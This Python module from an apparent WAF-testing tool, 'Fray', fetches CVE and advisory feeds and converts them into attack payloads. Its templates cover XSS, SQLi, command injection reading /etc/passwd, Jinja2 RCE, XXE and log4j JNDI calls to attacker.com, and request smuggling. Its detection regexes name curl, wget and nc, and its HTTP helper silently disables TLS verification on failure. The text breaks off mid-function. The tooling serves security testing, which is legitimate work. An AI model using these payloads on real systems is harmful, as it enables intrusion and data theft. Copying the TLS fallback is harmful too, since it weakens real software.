"""
Fray Threat Intelligence Feed — Auto-discover & ingest attack vectors.

Sources:
    1. NVD / CVE API  (NIST, free, no key required)
    2. CISA KEV       (Known Exploited Vulnerabilities catalog)
    3. GitHub Security Advisories (GraphQL API, GITHUB_TOKEN optional)
    4. ExploitDB      (public CSV + raw exploit mirror)
    5. RSS / Atom feeds (PortSwigger, Project Zero, etc.)
    6. Nuclei Templates (projectdiscovery GitHub)

Flow:
    fetch → parse → classify → translate to Fray payload → deduplicate → stage

Usage:
    fray feed                        # Fetch latest from all sources
    fray feed --sources nvd,cisa     # Specific sources only
    fray feed --since 7d             # Last 7 days
    fray feed --auto-add             # Auto-add to payload database
    fray feed --category xss         # Filter by category
    fray feed --dry-run              # Show what would be added

Cache: ~/.fray/threat_intel_cache.json
"""

import hashlib
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

from fray import __version__, PAYLOADS_DIR


# ── ANSI colors (inline, no deps) ────────────────────────────────────────────

class _C:
    B = "\033[1m"
    DIM = "\033[2m"
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    BL = "\033[94m"
    CY = "\033[96m"
    E = "\033[0m"


# ── Cache ─────────────────────────────────────────────────────────────────────

_CACHE_DIR = Path.home() / ".fray"
_CACHE_FILE = _CACHE_DIR / "threat_intel_cache.json"
_STAGING_DIR = _CACHE_DIR / "staged_payloads"


def _load_cache() -> Dict:
    if _CACHE_FILE.exists():
        try:
            return json.loads(_CACHE_FILE.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            pass
    return {
        "version": 1,
        "seen_cves": [],
        "seen_hashes": [],
        "last_fetch": {},
        "stats": {"total_fetched": 0, "total_added": 0, "total_skipped": 0},
    }


def _save_cache(cache: Dict) -> None:
    _CACHE_DIR.mkdir(parents=True, exist_ok=True)
    # Trim to prevent unbounded growth
    cache["seen_cves"] = cache["seen_cves"][-5000:]
    cache["seen_hashes"] = cache["seen_hashes"][-10000:]
    _CACHE_FILE.write_text(json.dumps(cache, indent=2, ensure_ascii=False),
                            encoding="utf-8")


# ── Payload schema ────────────────────────────────────────────────────────────

@dataclass
class ThreatPayload:
    """A payload discovered from threat intelligence."""
    payload: str
    category: str
    subcategory: str = ""
    description: str = ""
    cve: str = ""
    severity: str = "high"
    source: str = ""
    reference: str = ""
    technique: str = ""
    date_discovered: str = ""
    tags: List[str] = field(default_factory=list)

    @property
    def hash(self) -> str:
        return hashlib.sha256(self.payload.encode("utf-8", "replace")).hexdigest()[:16]

    def to_fray_format(self, idx: int = 0) -> Dict:
        """Convert to Fray payload JSON format."""
        entry = {
            "id": f"threat-intel-{self.cve or self.hash}-{idx:04d}",
            "category": self.category,
            "subcategory": self.subcategory or f"threat_intel_{self.category}",
            "payload": self.payload,
            "description": self.description,
            "source": self.source,
            "tested_against": [],
            "success_rate": 0.0,
            "blocked": False,
        }
        if self.cve:
            entry["cve"] = self.cve
        if self.severity:
            entry["severity"] = self.severity
        if self.reference:
            entry["reference"] = self.reference
        if self.technique:
            entry["technique"] = self.technique
        if self.date_discovered:
            entry["date_discovered"] = self.date_discovered
        if self.tags:
            entry["tags"] = self.tags
        return entry


# ── Stats ─────────────────────────────────────────────────────────────────────

@dataclass
class FeedStats:
    sources_queried: int = 0
    items_fetched: int = 0
    payloads_extracted: int = 0
    payloads_new: int = 0
    payloads_duplicate: int = 0
    payloads_added: int = 0
    payloads_tested: int = 0
    payloads_bypassed: int = 0
    payloads_blocked: int = 0
    test_target: str = ""
    errors: List[str] = field(default_factory=list)


# ── HTTP helper (stdlib only) ─────────────────────────────────────────────────

def _http_get(url: str, headers: Optional[Dict] = None,
              timeout: int = 15) -> Optional[str]:
    """Simple HTTP GET using urllib (no deps). Falls back to unverified SSL."""
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", f"Fray/{__version__} ThreatIntel")
    req.add_header("Accept", "application/json, application/xml, text/html, */*")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    # Try with default SSL first, fallback to unverified
    for use_unverified in (False, True):
        try:
            if use_unverified:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode("utf-8", errors="replace")
        except (ssl.SSLError, ssl.CertificateError):
            if not use_unverified:
                continue
            return None
        except urllib.error.URLError as e:
            # URLError may wrap an SSL error
            if not use_unverified and "SSL" in str(e):
                continue
            if not use_unverified:
                continue
            return None
        except urllib.error.HTTPError:
            return None
        except Exception:
            if not use_unverified:
                continue
            return None
    return None


def _http_get_json(url: str, headers: Optional[Dict] = None,
                   timeout: int = 15) -> Optional[Dict]:
    body = _http_get(url, headers, timeout)
    if body:
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            pass
    return None


# ── Category classifier ──────────────────────────────────────────────────────

# Maps keywords found in CVE descriptions / payloads → Fray category
_CATEGORY_RULES: List[Tuple[str, List[str]]] = [
    ("xss", ["cross-site scripting", "xss", "script injection",
             "reflected xss", "stored xss", "dom-based xss",
             "<script", "onerror=", "onload=", "javascript:",
             "alert(", "document.cookie", "innerHTML"]),
    ("sqli", ["sql injection", "sqli", "sql command", "sql query",
              "blind sql", "union select", "' or '", "1=1",
              "information_schema", "sqlmap", "order by"]),
    ("ssrf", ["server-side request forgery", "ssrf",
              "internal network", "localhost", "169.254",
              "metadata", "cloud-metadata", "file://",
              "gopher://", "dict://"]),
    ("ssti", ["template injection", "ssti", "server-side template",
              "jinja2", "twig", "freemarker", "velocity",
              "{{", "${", "#{T("]),
    ("command_injection", ["command injection", "rce", "remote code execution",
                           "os command", "shell injection", "exec(",
                           "system(", "popen(", "child_process",
                           "; ls", "| cat", "`whoami`",
                           "code execution", "arbitrary command"]),
    ("xxe", ["xml external entity", "xxe", "xml injection",
             "<!entity", "<!doctype", "file:///etc/passwd",
             "expect://"]),
    ("path_traversal", ["path traversal", "directory traversal",
                        "lfi", "local file inclusion",
                        "../", "..\\", "/etc/passwd",
                        "..%2f", "..%5c"]),
    ("open_redirect", ["open redirect", "url redirect", "redirect=",
                       "returnurl=", "next=", "dest=", "return_to=",
                       "unvalidated redirect", "redirect injection",
                       "redirect uri", "oauth redirect", "redirect bypass",
                       "redirect validation"]),
    ("prototype_pollution", ["prototype pollution", "__proto__",
                              "constructor.prototype",
                              "object.assign"]),
    ("crlf_injection", ["crlf injection", "http header injection",
                        "response splitting", "%0d%0a",
                        "\\r\\n", "header injection"]),
    ("file_upload", ["file upload", "unrestricted upload",
                     "web shell", "malicious file",
                     ".php", ".jsp", ".asp"]),
    ("csp_bypass", ["csp bypass", "content security policy",
                    "csp violation", "unsafe-inline",
                    "unsafe-eval", "nonce"]),
    # ── New categories ────────────────────────────────────────
    ("auth_bypass", ["authentication bypass", "auth bypass", "login bypass",
                     "access control", "broken authentication",
                     "improper authentication", "unauthorized access",
                     "privilege escalation", "improper access control",
                     "broken access control", "idor",
                     "insecure direct object reference",
                     "missing authorization", "authorization bypass",
                     "permission bypass", "account takeover"]),
    ("deserialization", ["deserialization", "deserialize", "unserialize",
                         "object injection", "java deserialization",
                         "pickle", "marshal", "yaml.load",
                         "insecure deserialization", "gadget chain",
                         "ysoserial", "phpggc"]),
    ("http_smuggling", ["request smuggling", "http smuggling",
                        "desync", "cl.te", "te.cl", "transfer-encoding",
                        "content-length", "http/2 smuggling",
                        "h2c smuggling", "request splitting"]),
    ("jwt_attack", ["jwt", "json web token", "jwt forgery",
                    "jwt bypass", "alg none", "jwk injection",
                    "token forging", "weak signing",
                    "jwt secret", "token tampering"]),
    ("graphql", ["graphql", "introspection", "graphql injection",
                 "batching attack", "query depth",
                 "graphql dos", "__schema"]),
    ("cors", ["cors misconfiguration", "cross-origin",
              "access-control-allow-origin", "cors bypass",
              "origin reflection", "cors wildcard"]),
    ("websocket", ["websocket", "ws://", "wss://",
                   "websocket hijacking", "cross-site websocket",
                   "cswsh", "websocket injection"]),
    ("dns_rebinding", ["dns rebinding", "dns rebind",
                       "toctou", "time-of-check"]),
    ("race_condition", ["race condition", "toctou",
                        "time-of-check-to-time-of-use",
                        "concurrency", "double spend"]),
    ("api_security", ["api abuse", "api key", "api exposure",
                      "broken object level", "bola", "bfla",
                      "mass assignment", "excessive data exposure",
                      "improper inventory", "rate limiting"]),
    ("cache_poisoning", ["cache poisoning", "web cache",
                         "cache deception", "cache key",
                         "host header injection"]),
    ("subdomain_takeover", ["subdomain takeover", "dangling dns",
                            "unclaimed subdomain", "cname"]),
    ("crypto_failures", ["weak cryptography", "broken crypto",
                         "weak cipher", "insufficient entropy",
                         "hardcoded secret", "hardcoded password",
                         "plaintext password", "weak hash",
                         "md5", "sha1", "weak key"]),
    ("log4j", ["log4j", "log4shell", "jndi", "jndi:ldap",
               "jndi:rmi", "jndi:dns"]),
    ("buffer_overflow", ["buffer overflow", "stack overflow",
                         "heap overflow", "out of bounds",
                         "memory corruption", "use-after-free"]),
    ("information_disclosure", ["information disclosure", "info leak",
                                "sensitive data exposure", "data leak",
                                "directory listing", "stack trace",
                                "error message", "debug mode"]),
    ("ssrf", ["dns rebinding", "internal service",
              "cloud metadata"]),
]


def classify_category(text: str, payload: str = "") -> str:
    """Classify a CVE/advisory into a Fray payload category."""
    combined = (text + " " + payload).lower()
    scores: Dict[str, int] = {}
    for cat, keywords in _CATEGORY_RULES:
        score = sum(1 for kw in keywords if kw.lower() in combined)
        if score > 0:
            scores[cat] = scores.get(cat, 0) + score
    if not scores:
        return "other"
    return max(scores, key=scores.get)


def classify_severity(cvss: float) -> str:
    if cvss >= 9.0:
        return "critical"
    if cvss >= 7.0:
        return "high"
    if cvss >= 4.0:
        return "medium"
    return "low"


# ── Payload extraction patterns ──────────────────────────────────────────────

# Regex patterns to extract payload-like strings from advisory text / PoC code
_PAYLOAD_PATTERNS = [
    # XSS patterns
    re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),
    re.compile(r'<\w+\s+on\w+\s*=\s*["\']?[^"\'>\s]+', re.IGNORECASE),
    re.compile(r'javascript:\s*\S+', re.IGNORECASE),
    # SQLi patterns
    re.compile(r"(?:' (?:OR|AND|UNION)\s+.{5,60})", re.IGNORECASE),
    re.compile(r"(?:UNION\s+(?:ALL\s+)?SELECT\s+.{5,80})", re.IGNORECASE),
    # Command injection
    re.compile(r'(?:;|\||\$\()\s*(?:ls|cat|id|whoami|curl|wget|nc)\b[^"\']{0,60}',
               re.IGNORECASE),
    # SSTI
    re.compile(r'\{\{.*?\}\}'),
    re.compile(r'\$\{[^}]{3,80}\}'),
    # Path traversal
    re.compile(r'(?:\.\./){2,}[\w/]+'),
    # SSRF
    re.compile(r'(?:file|gopher|dict|ftp)://\S+', re.IGNORECASE),
    # XXE
    re.compile(r'<!(?:DOCTYPE|ENTITY)\s+\S+.*?>', re.IGNORECASE | re.DOTALL),
]


def extract_payloads_from_text(text: str, category: str = "",
                                source: str = "") -> List[ThreatPayload]:
    """Extract payload-like strings from advisory/PoC text."""
    results = []
    seen = set()
    for pat in _PAYLOAD_PATTERNS:
        for match in pat.finditer(text):
            payload_str = match.group(0).strip()
            if len(payload_str) < 5 or len(payload_str) > 2000:
                continue
            h = hashlib.sha256(payload_str.encode()).hexdigest()[:16]
            if h in seen:
                continue
            seen.add(h)
            cat = category or classify_category("", payload_str)
            results.append(ThreatPayload(
                payload=payload_str,
                category=cat,
                source=source,
            ))
    return results


# ── CVE → Payload translator ─────────────────────────────────────────────────

# Well-known CVE payload templates per vulnerability class
_CVE_PAYLOAD_TEMPLATES: Dict[str, List[Dict]] = {
    "xss": [
        {"tpl": "<script>alert('{cve}')</script>", "sub": "reflected_xss"},
        {"tpl": "<img src=x onerror=alert('{cve}')>", "sub": "event_handler"},
        {"tpl": "<svg/onload=alert('{cve}')>", "sub": "svg_xss"},
        {"tpl": "javascript:alert('{cve}')", "sub": "javascript_uri"},
    ],
    "sqli": [
        {"tpl": "' OR 1=1-- /* {cve} */", "sub": "auth_bypass"},
        {"tpl": "' UNION SELECT null,version()-- /* {cve} */", "sub": "union_based"},
        {"tpl": "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- /* {cve} */", "sub": "error_based"},
    ],
    "ssrf": [
        {"tpl": "http://169.254.169.254/latest/meta-data/", "sub": "aws_metadata"},
        {"tpl": "http://metadata.google.internal/computeMetadata/v1/", "sub": "gcp_metadata"},
        {"tpl": "file:///etc/passwd", "sub": "file_read"},
    ],
    "command_injection": [
        {"tpl": "; id # {cve}", "sub": "basic_rce"},
        {"tpl": "| cat /etc/passwd # {cve}", "sub": "pipe_rce"},
        {"tpl": "`whoami` # {cve}", "sub": "backtick_rce"},
        {"tpl": "${{IFS}}cat${{IFS}}/etc/passwd # {cve}", "sub": "ifs_bypass"},
    ],
    "ssti": [
        {"tpl": "{{{{7*7}}}}", "sub": "detection"},
        {"tpl": "${{7*7}}", "sub": "el_detection"},
        {"tpl": "{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}", "sub": "jinja2_rce"},
    ],
    "xxe": [
        {"tpl": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "sub": "basic_xxe"},
        {"tpl": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', "sub": "oob_xxe"},
    ],
    "path_traversal": [
        {"tpl": "../../../../etc/passwd", "sub": "basic_lfi"},
        {"tpl": "..%2f..%2f..%2f..%2fetc%2fpasswd", "sub": "encoded_lfi"},
        {"tpl": "....//....//....//....//etc/passwd", "sub": "double_dot_lfi"},
    ],
    "auth_bypass": [
        {"tpl": "admin' --", "sub": "sql_auth_bypass"},
        {"tpl": "{\"role\": \"admin\", \"user\": \"attacker\"}", "sub": "role_escalation"},
        {"tpl": "X-Forwarded-For: 127.0.0.1", "sub": "ip_bypass"},
        {"tpl": "/admin/../admin", "sub": "path_normalization"},
    ],
    "deserialization": [
        {"tpl": 'O:8:"Exploit":1:{{s:4:"exec";s:2:"id";}}', "sub": "php_unserialize"},
        {"tpl": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "sub": "java_base64"},
        {"tpl": "__import__('os').popen('id').read()", "sub": "python_pickle"},
    ],
    "http_smuggling": [
        {"tpl": "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n", "sub": "cl_te"},
        {"tpl": "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n", "sub": "te_te"},
    ],
    "jwt_attack": [
        {"tpl": 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.', "sub": "alg_none"},
        {"tpl": '{"alg":"HS256","typ":"JWT"}.{"sub":"admin","role":"admin"}', "sub": "token_forge"},
    ],
    "graphql": [
        {"tpl": '{"query":"{__schema{types{name,fields{name}}}}"} ', "sub": "introspection"},
        {"tpl": '{"query":"query{user(id:1){id,email,password}}"}', "sub": "data_extraction"},
    ],
    "cors": [
        {"tpl": "Origin: https://evil.com", "sub": "origin_test"},
        {"tpl": "Origin: null", "sub": "null_origin"},
    ],
    "open_redirect": [
        {"tpl": "//evil.com", "sub": "protocol_relative"},
        {"tpl": "/\\evil.com", "sub": "backslash_bypass"},
        {"tpl": "https://target.com@evil.com", "sub": "at_sign_bypass"},
    ],
    "websocket": [
        {"tpl": "GET / HTTP/1.1\r\nUpgrade: websocket\r\nOrigin: https://evil.com\r\n", "sub": "cswsh"},
    ],
    "cache_poisoning": [
        {"tpl": "X-Forwarded-Host: evil.com", "sub": "host_override"},
        {"tpl": "X-Original-URL: /admin", "sub": "path_override"},
    ],
    "log4j": [
        {"tpl": "${{jndi:ldap://attacker.com/a}}", "sub": "basic_jndi"},
        {"tpl": "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://attacker.com/a}}", "sub": "obfuscated_jndi"},
    ],
    "api_security": [
        {"tpl": "GET /api/v1/users/2 HTTP/1.1", "sub": "bola"},
        {"tpl": '{"role":"admin","isAdmin":true}', "sub": "mass_assignment"},
    ],
    "information_disclosure": [
        {"tpl": "GET /.env HTTP/1.1", "sub": "env_file"},
        {"tpl": "GET /server-status HTTP/1.1", "sub": "server_status"},
        {"tpl": "GET /.git/config HTTP/1.1", "sub": "git_exposure"},
    ],
    "crypto_failures": [
        {"tpl": "GET /api/token?alg=none HTTP/1.1", "sub": "weak_alg"},
    ],
}


def cve_to_payloads(cve_id: str, description: str, category: str = "",
                     severity: str = "high", source: str = "",
                     reference: str = "",
                     extra_payloads: List[str] = None) -> List[ThreatPayload]:
    """Translate a CVE advisory into Fray payloads."""
    cat = category or classify_category(description)
    results = []
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    # Generate from templates
    templates = _CVE_PAYLOAD_TEMPLATES.get(cat, [])
    for tpl in templates:
        payload_str = tpl["tpl"].replace("{cve}", cve_id)
        results.append(ThreatPayload(
            payload=payload_str,
            category=cat,
            subcategory=tpl.get("sub", ""),
            description=f"{cve_id}: {description[:120]}",
            cve=cve_id,
            severity=severity,
            source=source or "threat_intel",
            reference=reference,
            technique=tpl.get("sub", ""),
            date_discovered=now,
            tags=["auto-generated", "threat-intel", cve_id.lower()],
        ))

    # Fallback: if no templates for this category, generate a generic reference payload
    if not templates and not extra_payloads:
        results.append(ThreatPayload(
            payload=f"# {cve_id} — {description[:200]}",
            category=cat,
            subcategory=f"cve_{cat}",
            description=f"{cve_id}: {description[:120]}",
            cve=cve_id,
            severity=severity,
            source=source or "threat_intel",
            reference=reference,
            technique=cat,
            date_discovered=now,
            tags=["cve-reference", "threat-intel", cve_id.lower()],
        ))

    # Extract payloads from description text
    text_payloads = extract_payloads_from_text(description, cat, source)
    for tp in text_payloads:
        tp.cve = cve_id
        tp.severity = severity
        tp.description = f"{cve_id}: extracted from advisory"
        tp.reference = reference
        tp.date_discovered = now
        tp.tags = ["extracted", "threat-intel", cve_id.lower()]
        results.append(tp)

    # Add any extra payloads (e.g. from PoC code)
    if extra_payloads:
        for i, ep in enumerate(extra_payloads):
            results.append(ThreatPayload(
                payload=ep,
                category=cat,
                subcategory=f"poc_{cat}",
                description=f"{cve_id}: PoC payload #{i+1}",
                cve=cve_id,
                severity=severity,
                source=source or "poc",
                reference=reference,
                technique="poc_extracted",
                date_discovered=now,
                tags=["poc", "threat-intel", cve_id.lower()],
            ))

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  SOURCE FETCHERS
# ══════════════════════════════════════════════════════════════════════════════


# ── 1. NVD / CVE API ─────────────────────────────────────────────────────────

def fetch_nvd(since_days: int = 7, category_filter: str = "",
              max_results: int = 50,
              enrich_poc: bool = False,
              verbose: bool = True) -> List[ThreatPayload]:
    """Fetch recent CVEs from NIST NVD API 2.0 (free, no key required).

    If enrich_poc=True, also scrapes GitHub/PacketStorm for real PoC payloads.
    """
    now = datetime.now(timezone.utc)
    start = now - timedelta(days=since_days)
    start_str = start.strftime("%Y-%m-%dT%H:%M:%S.000+00:00")
    end_str = now.strftime("%Y-%m-%dT%H:%M:%S.000+00:00")

    base = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {
        "pubStartDate": start_str,
        "pubEndDate": end_str,
        "resultsPerPage": str(min(max_results, 100)),
    }

    # Filter for web-related CVEs if category specified
    keyword_map = {
        "xss": "cross-site scripting",
        "sqli": "SQL injection",
        "ssrf": "server-side request forgery",
        "rce": "remote code execution",
        "command_injection": "command injection",
        "xxe": "XML external entity",
        "ssti": "template injection",
        "path_traversal": "path traversal",
    }
    if category_filter and category_filter in keyword_map:
        params["keywordSearch"] = keyword_map[category_filter]

    url = f"{base}?{urllib.parse.urlencode(params)}"
    if verbose:
        print(f"    {_C.DIM}NVD API: fetching CVEs since {start.strftime('%Y-%m-%d')}...{_C.E}")

    data = _http_get_json(url, timeout=30)
    if not data:
        if verbose:
            print(f"    {_C.R}NVD API: failed to fetch{_C.E}")
        return []

    results = []
    vulnerabilities = data.get("vulnerabilities", [])
    if verbose:
        print(f"    {_C.DIM}NVD: {len(vulnerabilities)} CVEs found{_C.E}")

    for vuln in vulnerabilities:
        cve_data = vuln.get("cve", {})
        cve_id = cve_data.get("id", "")
        if not cve_id:
            continue

        # Get description
        desc_list = cve_data.get("descriptions", [])
        description = ""
        for d in desc_list:
            if d.get("lang") == "en":
                description = d.get("value", "")
                break
        if not description and desc_list:
            description = desc_list[0].get("value", "")

        # Get CVSS score
        metrics = cve_data.get("metrics", {})
        cvss = 0.0
        for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            metric_list = metrics.get(key, [])
            if metric_list:
                cvss = metric_list[0].get("cvssData", {}).get("baseScore", 0.0)
                break

        # Only process high/critical CVEs for web categories
        if cvss < 6.0:
            continue

        severity = classify_severity(cvss)
        cat = classify_category(description)

        # If user specified a category filter, skip non-matching
        if category_filter and cat != category_filter:
            continue

        # Get references for PoC links
        refs = cve_data.get("references", [])
        ref_url = ""
        poc_urls = []
        for r in refs:
            url_r = r.get("url", "")
            if not ref_url:
                ref_url = url_r
            tags_r = r.get("tags", [])
            if "Exploit" in tags_r or "exploit" in url_r.lower():
                poc_urls.append(url_r)

        # Extract real PoC payloads from exploit references
        extra_poc = []
        if enrich_poc and poc_urls and cvss >= 7.0:
            try:
                from fray.poc_extractor import extract_poc_payloads
                poc_result = extract_poc_payloads(
                    cve_id=cve_id, cve_data=cve_data,
                    max_sources=3, timeout=12, delay=0.5,
                )
                for ep in poc_result.extracted_payloads:
                    extra_poc.append(ep.get("payload", "")[:500])
                if verbose and extra_poc:
                    print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
            except Exception:
                pass

        payloads = cve_to_payloads(
            cve_id=cve_id,
            description=description,
            category=cat,
            severity=severity,
            source=f"NVD (CVSS {cvss})",
            reference=ref_url,
            extra_payloads=extra_poc if extra_poc else None,
        )
        results.extend(payloads)

    return results


# ── 2. CISA KEV ──────────────────────────────────────────────────────────────

def fetch_cisa_kev(since_days: int = 30,
                   verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from CISA Known Exploited Vulnerabilities catalog."""
    url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    if verbose:
        print(f"    {_C.DIM}CISA KEV: fetching catalog...{_C.E}")

    data = _http_get_json(url, timeout=30)
    if not data:
        if verbose:
            print(f"    {_C.R}CISA KEV: failed to fetch{_C.E}")
        return []

    cutoff = datetime.now(timezone.utc) - timedelta(days=since_days)
    results = []
    vulns = data.get("vulnerabilities", [])

    if verbose:
        print(f"    {_C.DIM}CISA KEV: {len(vulns)} total entries{_C.E}")

    for v in vulns:
        date_str = v.get("dateAdded", "")
        try:
            added = datetime.strptime(date_str, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except (ValueError, TypeError):
            continue

        if added < cutoff:
            continue

        cve_id = v.get("cveID", "")
        description = v.get("shortDescription", "") or v.get("vulnerabilityName", "")
        cat = classify_category(description)

        # CISA KEV = actively exploited = always critical
        payloads = cve_to_payloads(
            cve_id=cve_id,
            description=description,
            category=cat,
            severity="critical",
            source="CISA KEV (actively exploited)",
            reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
        )
        results.extend(payloads)

    return results


# ── 3. GitHub Security Advisories ─────────────────────────────────────────────

def fetch_github_advisories(since_days: int = 7, max_results: int = 30,
                            verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from GitHub Security Advisories (REST API)."""
    token = os.environ.get("GITHUB_TOKEN", "")
    headers = {}
    if token:
        headers["Authorization"] = f"token {token}"
    headers["Accept"] = "application/vnd.github+json"

    since = (datetime.now(timezone.utc) - timedelta(days=since_days)).strftime("%Y-%m-%dT%H:%M:%SZ")

    if verbose:
        auth = "authenticated" if token else "unauthenticated (set GITHUB_TOKEN for more)"
        print(f"    {_C.DIM}GitHub Advisories: fetching ({auth})...{_C.E}")

    # API only accepts a single severity value, so query both separately
    data: List[Dict] = []
    half = max(max_results // 2, 10)
    for sev in ("critical", "high"):
        url = (f"https://api.github.com/advisories"
               f"?type=reviewed&severity={sev}"
               f"&per_page={min(half, 100)}"
               f"&sort=published&direction=desc")
        page = _http_get_json(url, headers=headers, timeout=20)
        if isinstance(page, list):
            data.extend(page)

    if not data:
        if verbose:
            print(f"    {_C.R}GitHub Advisories: failed to fetch{_C.E}")
        return []

    if verbose:
        print(f"    {_C.DIM}GitHub Advisories: {len(data)} entries{_C.E}")

    results = []
    for adv in data:
        cve_id = adv.get("cve_id", "") or ""
        summary = adv.get("summary", "")
        description = adv.get("description", "")
        severity = adv.get("severity", "high")
        html_url = adv.get("html_url", "")

        full_text = f"{summary} {description}"
        cat = classify_category(full_text)

        payloads = cve_to_payloads(
            cve_id=cve_id or adv.get("ghsa_id", "GHSA-unknown"),
            description=summary[:200],
            category=cat,
            severity=severity,
            source="GitHub Security Advisory",
            reference=html_url,
        )

        # Also extract any payloads from description text
        text_payloads = extract_payloads_from_text(description, cat,
                                                    "GitHub Advisory")
        for tp in text_payloads:
            tp.cve = cve_id
            tp.reference = html_url
            payloads.append(tp)

        results.extend(payloads)

    return results


# ── 4. ExploitDB (via public search) ─────────────────────────────────────────

def fetch_exploitdb(since_days: int = 7, category_filter: str = "",
                    verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from ExploitDB via their public RSS feed."""
    url = "https://www.exploit-db.com/rss.xml"
    if verbose:
        print(f"    {_C.DIM}ExploitDB: fetching RSS feed...{_C.E}")

    body = _http_get(url, timeout=20)
    if not body:
        if verbose:
            print(f"    {_C.R}ExploitDB: failed to fetch{_C.E}")
        return []

    results = []
    # Simple XML parsing without external deps
    items = re.findall(r'<item>(.*?)</item>', body, re.DOTALL)
    if verbose:
        print(f"    {_C.DIM}ExploitDB: {len(items)} items{_C.E}")

    for item in items[:30]:  # Limit processing
        title = _xml_text(item, "title")
        link = _xml_text(item, "link")
        desc = _xml_text(item, "description")

        full = f"{title} {desc}"
        cat = classify_category(full)

        web_cats = {"xss", "sqli", "ssrf", "ssti", "command_injection",
                    "xxe", "path_traversal", "crlf_injection"}
        if cat not in web_cats:
            continue
        if category_filter and cat != category_filter:
            continue

        # Extract payload-like strings from description
        text_payloads = extract_payloads_from_text(desc, cat, "ExploitDB")
        for tp in text_payloads:
            tp.description = title[:120]
            tp.reference = link
            tp.tags = ["exploitdb", "threat-intel"]
            results.append(tp)

        # If no payloads extracted, generate from templates
        if not text_payloads:
            templates = _CVE_PAYLOAD_TEMPLATES.get(cat, [])[:2]
            for tpl in templates:
                results.append(ThreatPayload(
                    payload=tpl["tpl"].format(cve=title[:30]),
                    category=cat,
                    subcategory=tpl.get("sub", ""),
                    description=f"ExploitDB: {title[:120]}",
                    source="ExploitDB",
                    reference=link,
                    tags=["exploitdb", "threat-intel"],
                ))

    return results


def _xml_text(xml: str, tag: str) -> str:
    m = re.search(rf'<{tag}[^>]*>(.*?)</{tag}>', xml, re.DOTALL)
    if m:
        text = m.group(1).strip()
        # Strip CDATA
        text = re.sub(r'<!\[CDATA\[(.*?)\]\]>', r'\1', text, flags=re.DOTALL)
        return text
    return ""


# ── 5. Security RSS Feeds ────────────────────────────────────────────────────

_RSS_FEEDS = [
    {
        "name": "PortSwigger Research",
        "url": "https://portswigger.net/research/rss",
        "focus": ["xss", "sqli", "ssrf", "ssti"],
    },
    {
        "name": "Project Zero",
        "url": "https://googleprojectzero.blogspot.com/feeds/posts/default?alt=rss",
        "focus": ["command_injection", "path_traversal"],
    },
    {
        "name": "The Hacker News",
        "url": "https://feeds.feedburner.com/TheHackersNews",
        "focus": [],
    },
]


def fetch_rss_feeds(since_days: int = 7, verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from curated security RSS feeds."""
    results = []
    for feed in _RSS_FEEDS:
        if verbose:
            print(f"    {_C.DIM}RSS: {feed['name']}...{_C.E}")

        body = _http_get(feed["url"], timeout=15)
        if not body:
            if verbose:
                print(f"    {_C.Y}RSS: {feed['name']} — skipped (unreachable){_C.E}")
            continue

        # Support both RSS (<item>) and Atom (<entry>) formats
        items = re.findall(r'<item>(.*?)</item>', body, re.DOTALL)
        if not items:
            items = re.findall(r'<entry>(.*?)</entry>', body, re.DOTALL)
        for item in items[:15]:
            title = _xml_text(item, "title")
            link = _xml_text(item, "link")
            # Atom uses <link href="..."/> instead of <link>...</link>
            if not link:
                m = re.search(r'<link[^>]+href=["\']([^"\']+)', item)
                if m:
                    link = m.group(1)
            desc = _xml_text(item, "description") or _xml_text(item, "content") or _xml_text(item, "summary")

            full = f"{title} {desc}"
            cat = classify_category(full)
            if cat == "other":
                continue

            text_payloads = extract_payloads_from_text(desc, cat, feed["name"])
            for tp in text_payloads:
                tp.description = f"{feed['name']}: {title[:100]}"
                tp.reference = link
                tp.tags = ["rss", "threat-intel", feed["name"].lower().replace(" ", "_")]
                results.append(tp)

    return results


# ── 6. Nuclei Templates (new additions) ──────────────────────────────────────

def fetch_nuclei_templates(since_days: int = 7,
                           verbose: bool = True) -> List[ThreatPayload]:
    """Fetch recently added Nuclei templates from projectdiscovery/nuclei-templates."""
    token = os.environ.get("GITHUB_TOKEN", "")
